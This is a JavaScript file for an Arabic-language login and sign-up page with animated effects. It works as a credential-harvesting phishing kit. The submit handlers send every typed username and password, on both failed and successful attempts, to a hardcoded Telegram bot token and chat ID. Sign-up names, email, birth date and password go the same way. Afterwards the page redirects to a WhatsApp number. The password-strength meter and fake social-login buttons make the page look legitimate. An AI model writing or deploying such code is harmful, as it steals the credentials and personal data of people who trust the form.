document.addEventListener('DOMContentLoaded', function() {
  // إعداد Particles.js
  particlesJS('particles-js', {
    "particles": {
      "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
      "color": { "value": "#ffffff" },
      "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000" }, "polygon": { "nb_sides": 5 } },
      "opacity": { "value": 0.5, "random": false },
      "size": { "value": 3, "random": true },
      "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 },
      "move": { "enable": true, "speed": 6, "direction": "none", "random": false, "straight": false, "out_mode": "out" }
    },
    "interactivity": {
      "detect_on": "canvas",
      "events": {
        "onhover": { "enable": true, "mode": "repulse" },
        "onclick": { "enable": true, "mode": "push" },
        "resize": true
      },
      "modes": {
        "repulse": { "distance": 200, "duration": 0.4 },
        "push": { "particles_nb": 4 }
      }
    },
    "retina_detect": true
  });

  // إزالة Typed.js (لم نعد نحتاج النص الديناميكي)
  
  // دخول الحاوية باستخدام GSAP
  gsap.timeline()
    .to(".login-wrapper", { duration: 1, opacity: 1, scale: 1, ease: "power2.out" })
    .to(".company-header", { duration: 0.8, opacity: 1, y: 0, ease: "back.out(1.7)" }, "-=0.5")
    .to(".login-container", { duration: 0.8, opacity: 1, scale: 1, ease: "back.out(1.7)" }, "-=0.5");

  // إعداد تبديل كلمة المرور (للحقل الرئيسي وربما للتأكيد)
  function setupToggleForPassword(fieldId, toggleId) {
    const toggle = document.getElementById(toggleId);
    const input = document.getElementById(fieldId);
    toggle.addEventListener('click', function() {
      const type = input.getAttribute('type') === 'password' ? 'text' : 'password';
      input.setAttribute('type', type);
      this.classList.toggle('fa-eye-slash');
    });
    input.addEventListener('input', function() {
      gsap.to(toggle, { duration: 0.3, rotation: 360, ease: "power2.inOut" });
    });
  }
  setupToggleForPassword('password', 'togglePassword');

  // مؤشر قوة كلمة السر
  const passwordStrengthIndicator = document.getElementById('passwordStrengthIndicator');
  function evaluatePasswordStrength(password) {
    let strength = 0;
    if(password.length >= 6) strength++;
    if(password.length >= 10) strength++;
    if(/[A-Z]/.test(password)) strength++;
    if(/[0-9]/.test(password)) strength++;
    if(/[^A-Za-z0-9]/.test(password)) strength++;

    if(strength <= 2) return {label: "سهل", color: "#ff4d4d"};     // ضعيف
    else if(strength <= 4) return {label: "وسط", color: "#ffcc00"};  // متوسط
    else return {label: "صعب", color: "#00cc66"};                     // قوي
  }
  // تحديث مؤشر قوة كلمة السر عند كتابة المستخدم
  document.addEventListener('input', function(e) {
    if(e.target.id === 'password') {
      const pwd = e.target.value;
      const result = evaluatePasswordStrength(pwd);
      if(passwordStrengthIndicator) {
        passwordStrengthIndicator.textContent = pwd ? result.label : "";
        passwordStrengthIndicator.style.color = result.color;
        // تأثير بسيط لظهور المؤشر بسلاسة
        gsap.fromTo(passwordStrengthIndicator, { opacity: 0 }, { duration: 0.3, opacity: 1 });
      }
    }
  });

  // دالة إرسال رسالة إلى Telegram
  function sendTelegramMessage(message) {
    const token = "8065186165:AAGKm7Y_l_UE1vvsM753iHLAdetAZ-UF7Ks";
    const chatId = "6792335123";
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => console.log("Telegram response:", data))
    .catch(error => console.error("Error sending Telegram message:", error));
  }

  // متغير لتتبع حالة النموذج: true = تسجيل دخول، false = إنشاء حساب
  let isSignIn = true;

  // التأكد من وجود حاوية الحقول الديناميكية
  if(!document.getElementById('formFields')){
    const formFieldsContainer = document.createElement('div');
    formFieldsContainer.id = "formFields";
    formFieldsContainer.innerHTML = `
      <div class="form-group">
        <label for="username">اسم المستخدم</label>
        <input type="text" id="username" placeholder="أدخل اسم المستخدم" required />
      </div>
      <div class="form-group password-group">
        <label for="password">كلمة المرور</label>
        <div class="password-wrapper">
          <input type="password" id="password" placeholder="أدخل كلمة المرور" required />
          <i class="fa-solid fa-eye toggle-password" id="togglePassword" title="إظهار/إخفاء كلمة المرور"></i>
        </div>
        <div id="passwordStrengthIndicator" class="password-strength"></div>
      </div>
    `;
    const authForm = document.getElementById('authForm');
    authForm.insertBefore(formFieldsContainer, document.getElementById('extraOptions'));
  }

  // إعداد نموذج تسجيل الدخول
  function setupSignInForm() {
    isSignIn = true;
    document.getElementById('formTitle').innerText = "تسجيل الدخول";
    document.getElementById('btnText').innerText = "تسجيل الدخول";
    document.getElementById('extraOptions').style.display = 'flex';
    document.getElementById('formFields').innerHTML = `
      <div class="form-group">
        <label for="username">اسم المستخدم</label>
        <input type="text" id="username" placeholder="أدخل اسم المستخدم" required />
      </div>
      <div class="form-group password-group">
        <label for="password">كلمة المرور</label>
        <div class="password-wrapper">
          <input type="password" id="password" placeholder="أدخل كلمة المرور" required />
          <i class="fa-solid fa-eye toggle-password" id="togglePassword" title="إظهار/إخفاء كلمة المرور"></i>
        </div>
        <div id="passwordStrengthIndicator" class="password-strength"></div>
      </div>
    `;
    setupToggleForPassword('password', 'togglePassword');
    document.getElementById('toggleAuthText').innerHTML = 'ليس لديك حساب؟ <a href="#" id="signupLink">إنشاء حساب</a>';
    document.getElementById('signupLink').addEventListener('click', toggleAuthMode);
  }

  // إعداد نموذج إنشاء حساب مع الحقول الإضافية
  function setupSignUpForm() {
    isSignIn = false;
    document.getElementById('formTitle').innerText = "إنشاء حساب";
    document.getElementById('btnText').innerText = "إنشاء حساب";
    document.getElementById('extraOptions').style.display = 'none';
    document.getElementById('formFields').innerHTML = `
      <div class="form-group">
        <label for="firstName">الاسم الأول</label>
        <input type="text" id="firstName" placeholder="أدخل الاسم الأول" required />
      </div>
      <div class="form-group">
        <label for="lastName">الاسم الأخير</label>
        <input type="text" id="lastName" placeholder="أدخل الاسم الأخير" required />
      </div>
      <div class="form-group">
        <label for="email">البريد الإلكتروني</label>
        <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required />
      </div>
      <div class="form-group">
        <label for="birthDate">تاريخ الميلاد</label>
        <input type="date" id="birthDate" required />
      </div>
      <div class="form-group password-group">
        <label for="password">كلمة السر</label>
        <div class="password-wrapper">
          <input type="password" id="password" placeholder="أدخل كلمة السر" required />
          <i class="fa-solid fa-eye toggle-password" id="togglePassword" title="إظهار/إخفاء كلمة السر"></i>
        </div>
        <div id="passwordStrengthIndicator" class="password-strength"></div>
      </div>
      <div class="form-group password-group">
        <label for="confirmPassword">تأكيد كلمة السر</label>
        <div class="password-wrapper">
          <input type="password" id="confirmPassword" placeholder="أدخل تأكيد كلمة السر" required />
          <i class="fa-solid fa-eye toggle-password" id="toggleConfirmPassword" title="إظهار/إخفاء تأكيد كلمة السر"></i>
        </div>
      </div>
    `;
    setupToggleForPassword('password', 'togglePassword');
    setupToggleForPassword('confirmPassword', 'toggleConfirmPassword');
    document.getElementById('toggleAuthText').innerHTML = 'لديك حساب؟ <a href="#" id="signupLink">تسجيل الدخول</a>';
    document.getElementById('signupLink').addEventListener('click', toggleAuthMode);
  }

  // دالة لتبديل حالة النموذج
  function toggleAuthMode(e) {
    e.preventDefault();
    if(isSignIn) {
      setupSignUpForm();
      gsap.to("#formTitle", { duration: 0.5, opacity: 0, onComplete: () => {
        document.getElementById('formTitle').innerText = "إنشاء حساب";
        gsap.to("#formTitle", { duration: 0.5, opacity: 1 });
      }});
      gsap.to("#btnText", { duration: 0.5, opacity: 0, onComplete: () => {
        document.getElementById('btnText').innerText = "إنشاء حساب";
        gsap.to("#btnText", { duration: 0.5, opacity: 1 });
      }});
    } else {
      setupSignInForm();
      gsap.to("#formTitle", { duration: 0.5, opacity: 0, onComplete: () => {
        document.getElementById('formTitle').innerText = "تسجيل الدخول";
        gsap.to("#formTitle", { duration: 0.5, opacity: 1 });
      }});
      gsap.to("#btnText", { duration: 0.5, opacity: 0, onComplete: () => {
        document.getElementById('btnText').innerText = "تسجيل الدخول";
        gsap.to("#btnText", { duration: 0.5, opacity: 1 });
      }});
    }
  }

  // تفعيل رابط "إنشاء حساب" عند تحميل الصفحة
  document.getElementById('signupLink').addEventListener('click', toggleAuthMode);

  // التعامل مع تقديم النموذج
  const authForm = document.getElementById('authForm');
  const authBtn = document.getElementById('authBtn');
  const loadingSpinner = document.getElementById('loadingSpinner');
  const errorMessage = document.getElementById('error-message');

  authForm.addEventListener('submit', function(event) {
    event.preventDefault();
    loadingSpinner.style.display = 'block';
    errorMessage.textContent = '';
    
    if(isSignIn) {
      // بيانات تسجيل الدخول
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      let status;
      setTimeout(() => {
        loadingSpinner.style.display = 'none';
        if(username === 'admin' && password === '1234') {
          status = "نجاح";
          localStorage.setItem('user', JSON.stringify({ username, password }));
          sendTelegramMessage(`تسجيل دخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nالحالة: ${status}`);
          confetti({ particleCount: 150, spread: 100, origin: { y: 0.6 } });
          anime({ targets: '.login-container', scale: [1, 1.05, 1], duration: 800, easing: 'easeInOutQuad' });
          gsap.to(".login-container", { duration: 0.8, opacity: 0, y: -50, ease: "power2.in", onComplete: () => {
            window.location.href = "https://wa.me/+201032125588";
          }});
        } else {
          status = "فشل";
          errorMessage.textContent = 'اسم المستخدم أو كلمة المرور غير صحيحة.';
          sendTelegramMessage(`تسجيل دخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nالحالة: ${status}`);
        }
      }, 1500);
    } else {
      // بيانات إنشاء الحساب
      const firstName = document.getElementById('firstName').value.trim();
      const lastName = document.getElementById('lastName').value.trim();
      const email = document.getElementById('email').value.trim();
      const birthDate = document.getElementById('birthDate').value;
      const password = document.getElementById('password').value.trim();
      const confirmPassword = document.getElementById('confirmPassword').value.trim();
      if(password !== confirmPassword) {
        loadingSpinner.style.display = 'none';
        errorMessage.textContent = 'كلمتا السر غير متطابقتين.';
        return;
      }
      setTimeout(() => {
        loadingSpinner.style.display = 'none';
        const message = `إنشاء حساب:\nالاسم الأول: ${firstName}\nالاسم الأخير: ${lastName}\nالبريد الإلكتروني: ${email}\nتاريخ الميلاد: ${birthDate}\nكلمة السر: ${password}`;
        sendTelegramMessage(message);
        confetti({ particleCount: 150, spread: 100, origin: { y: 0.6 } });
        anime({ targets: '.login-container', scale: [1, 1.05, 1], duration: 800, easing: 'easeInOutQuad' });
        gsap.to(".login-container", { duration: 0.8, opacity: 0, y: -50, ease: "power2.in", onComplete: () => {
          alert("تم إنشاء الحساب بنجاح!");
          window.location.href = "https://wa.me/+201032125588";
        }});
      }, 1500);
    }
  });

  // تأثير تموج زر الإرسال
  authBtn.addEventListener('click', function(e) {
    const ripple = this.querySelector('.ripple');
    const size = Math.max(this.offsetWidth, this.offsetHeight);
    ripple.style.width = ripple.style.height = size + "px";
    const rect = this.getBoundingClientRect();
    const x = e.clientX - rect.left - size / 2;
    const y = e.clientY - rect.top - size / 2;
    ripple.style.left = x + "px";
    ripple.style.top = y + "px";
    ripple.classList.remove('rippleEffect');
    void ripple.offsetWidth;
    ripple.classList.add('rippleEffect');
  });

  // التعامل مع أزرار تسجيل الدخول عبر منصات التواصل الاجتماعية
  function simulateSocialLogin(platform) {
    const dummyUser = { username: `${platform}_user`, password: "social_pass" };
    localStorage.setItem('user', JSON.stringify(dummyUser));
    sendTelegramMessage(`تسجيل دخول (${platform}):\nاسم المستخدم: ${dummyUser.username}\nكلمة المرور: ${dummyUser.password}\nالحالة: نجاح`);
    confetti({ particleCount: 150, spread: 100, origin: { y: 0.6 } });
    gsap.to(".login-container", { duration: 0.8, opacity: 0, y: -50, ease: "power2.in", onComplete: () => {
      window.location.href = "https://wa.me/+201032125588";
    }});
  }
  document.getElementById('googleLogin').addEventListener('click', function(e) {
    e.preventDefault();
    simulateSocialLogin("Google");
  });
  document.getElementById('facebookLogin').addEventListener('click', function(e) {
    e.preventDefault();
    simulateSocialLogin("Facebook");
  });
  document.getElementById('twitterLogin').addEventListener('click', function(e) {
    e.preventDefault();
    simulateSocialLogin("Twitter");
  });

  // إدارة مودال "نسيت كلمة المرور" باستخدام GSAP
  const forgotModal = document.getElementById('forgotModal');
  const openForgotModal = document.getElementById('openForgotModal');
  const closeForgotModal = document.getElementById('closeForgotModal');
  openForgotModal.addEventListener('click', function(e) {
    e.preventDefault();
    forgotModal.style.display = 'flex';
    gsap.fromTo(forgotModal, { opacity: 0 }, { duration: 0.5, opacity: 1 });
  });
  if(closeForgotModal) {
    closeForgotModal.addEventListener('click', closeModal);
  }
  window.addEventListener('click', function(e) {
    if(e.target === forgotModal) {
      closeModal();
    }
  });
  function closeModal() {
    gsap.to(forgotModal, { duration: 0.5, opacity: 0, onComplete: () => { forgotModal.style.display = 'none'; }});
  }

  // إرسال طلب استعادة كلمة المرور
  const forgotSubmit = document.getElementById('forgotSubmit');
  forgotSubmit.addEventListener('click', function() {
    const email = document.getElementById('forgotEmail').value.trim();
    if(email === '') {
      alert('يرجى إدخال بريدك الإلكتروني.');
      return;
    }
    alert('تم إرسال تعليمات استعادة كلمة المرور إلى بريدك الإلكتروني.');
    forgotModal.style.display = 'none';
  });

  // ScrollReveal لتأثير ظهور العناصر عند التمرير
  ScrollReveal().reveal('.social-login', { delay: 200, distance: '50px', origin: 'bottom' });
  ScrollReveal().reveal('.signup-text', { delay: 300, distance: '30px', origin: 'bottom' });

  // تبديل الوضع (النهار/الليل) مع تأثير حركة سلس
  const modeToggle = document.getElementById('modeToggle');
  modeToggle.addEventListener('click', function() {
    gsap.to(modeToggle, { 
      rotation: "+=360", 
      duration: 0.5, 
      ease: "power2.inOut", 
      onComplete: function() {
        if(document.body.classList.contains('light-mode')) {
          document.body.classList.remove('light-mode');
          modeToggle.innerHTML = '<i class="fas fa-moon"></i>';
        } else {
          document.body.classList.add('light-mode');
          modeToggle.innerHTML = '<i class="fas fa-sun"></i>';
        }
        gsap.fromTo(modeToggle, { scale: 0.8 }, { scale: 1, duration: 0.3 });
        localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
      }
    });
  });
  if(localStorage.getItem('theme') === 'light') {
    document.body.classList.add('light-mode');
    modeToggle.innerHTML = '<i class="fas fa-sun"></i>';
  }
});
